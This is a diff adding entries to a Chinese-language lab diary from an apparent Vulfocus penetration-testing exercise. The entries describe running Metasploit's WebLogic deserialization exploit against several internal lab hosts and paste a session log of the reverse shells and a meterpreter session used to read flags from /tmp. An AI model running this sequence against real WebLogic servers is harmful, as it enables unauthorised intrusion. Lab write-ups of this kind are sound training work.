@@ -40,3 +40,70 @@
   有趣的是rock似乎遇到了和我开始打算用WSL作为Attacker主机使用时很像的msfdb初始化问题，目前还不清楚他具体遇到了什么问题
 
 - 2023年7月17日，昨天（16日）一整天都因为电脑不知道原因的黑屏死机而折腾，进度也因为死机重启数据截图完全没有得到保留...并不是说今天电脑就好了，只能一边祈祷着不出问题一边尽可能多留下一些截图之类的东西
+
+- 2023年7月17日，顺利在没有黑屏的情况下执行到了第二层内网三台weblogic漏洞主机的flag，虽然为了省事在主机存活扫描和exploit搜索时都直接使用了白盒端口和CVE直接搜索
+
+  另外是在使用过程中发现的，metasploit在添加options时可以使用类似正则的表达来一次run执行多个主机的exploit，效果的话就和下图的效果一样：
+
+  ![screenShot](./img/2023-07-17-191855.png)
+
+  很显然中间因为有个192.170.84.4是外层struts2漏洞的主机导致破解失败，不过另外三台主机都没有问题，会在sessions里面直接get到3个会话，直接接入进去查看flag就好，操作的话姑且用下面的code block进行记录：
+
+  ```metasploit
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions
+
+  Active sessions
+  ===============
+
+    Id  Name  Type                   Information          Connection
+    --  ----  ----                   -----------          ----------
+    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58718 (172.29.108.146)
+    2         meterpreter x86/linux  root @ 192.170.84.4  192.168.56.107:4433 -> 192.168.56.1:58648 (172.29.108.146)
+    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58646 (192.170.84.2)
+    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58662 (192.170.84.3)
+    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58702 (192.170.84.5)
+
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 3
+  [*] Starting interaction with 3...
+
+  ls /tmp
+  bea1061393648233859820.tmp
+  cookie.txt
+  flag-{bmh847737fd-8975-4b37-b977-f50474a56937}
+  hsperfdata_root
+  packages
+  wlstTemproot
+  ^Z
+  Background session 3? [y/N]  y
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 4
+  [*] Starting interaction with 4...
+
+  ls /tmp
+  bea1061393648233859820.tmp
+  cookie.txt
+  flag-{bmh0b089d55-4a89-41ea-b31f-e8f775ce1952}
+  hsperfdata_root
+  packages
+  wlstTemproot
+  ^Z
+  Background session 4? [y/N]  y
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 5
+  [*] Starting interaction with 5...
+
+  ls /tmp
+  bea1061393648233859820.tmp
+  cookie.txt
+  flag-{bmh0d1008a5-7a3d-43c8-a6a9-03fadae3bd8d}
+  hsperfdata_root
+  packages
+  wlstTemproot
+  ^Z
+  Background session 5? [y/N]  y
+  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
+  ```
+
+  分别将flag贴到vulfocus的场景中就可以看到进度已经来到80%了，大顺利~
+
+  ![screenShot](./img/2023-07-17-192034.png)
+
+  唯一的疑惑是为什么明明还有一台nginx的php漏洞主机没交flag，但是却已经显示已完成了🤔
